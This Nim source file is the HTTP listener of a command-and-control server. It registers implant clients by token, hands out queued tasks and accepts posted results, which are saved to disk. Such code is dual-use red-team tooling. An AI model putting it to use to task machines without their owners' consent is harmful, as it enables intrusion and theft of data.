import std/[
  asyncdispatch, 
  asynchttpserver, 
  asyncfutures, 
  strutils, 
  times
]

import ../types, ../logging, ../processMessage, ../events, ../../utils, ../tasks

import tlv

proc createNewHttpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
  let ipAddress = instance.ipAddress
  let port = instance.port

  var clientMap: seq[tuple[token: string, client: ref C2Client]] = @[]

  var httpServer = newAsyncHttpServer()

  proc cb(req: Request) {.async, gcsafe.} =
    # echo (req.reqMethod, req.url, req.headers)
    let headers = {"Content-type": "text/plain; charset=utf-8"}
    if req.url.path == "/r":
      let token = rndStr()
      let cRef = new(ref C2Client)
      cRef[] = C2Client(
        id: token.split("-")[0],
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server,
        ipAddress: req.hostname,
        lastCheckin: now()
      )
      clientMap.add (token: token, client: cRef)
      await req.respond(Http200, token, headers.newHttpHeaders())
    elif req.url.path == "/t":
      var client: ref C2Client
      let token = req.url.query.split("=")[1]
      for c in clientMap:
        if c.token == token:
          client = c.client
      if client.isNil():
        await req.respond(Http400, "error", headers.newHttpHeaders())
        return
      if req.reqMethod == HttpPost:
        if not client.isNil():
          writeFile("a.bin", req.body)
          {.gcsafe.}:
            discard processMessage(client, instance, req.body) 
          await req.respond(Http200, "ok", headers.newHttpHeaders())
        else: 
          await req.respond(Http400, "error", headers.newHttpHeaders())
      elif req.reqMethod == HttpGet:
        client.lastCheckin = now()
        onClientCheckin(client[])
        
        var tasks: seq[Task]
        for task in server.tasks:
          if task.status == TaskCreated and task.client == client[]:
            task.status = TaskNotCompleted
            tasks.add task

        let b = initBuilder()
        b.addInt32(cast[int32](len tasks))
        for task in tasks: b.addString(task.toTLV())

        await req.respond(
          Http200, 
          b.encodeString(), 
          headers.newHttpHeaders()
        )

  httpServer.listen(port)

  infoLog "listening on " & ipAddress & ":" & $port.uint32 & " using a http server"
  while true:
    if httpServer.shouldAcceptRequest():
      await httpServer.acceptRequest(cb)
    else:
      # too many concurrent connections, `maxFDs` exceeded
      # wait 500ms for FDs to be closed
      await sleepAsync(500)


let listener* = Listener(
  name: "http",
  startProc: createNewHttpListener
)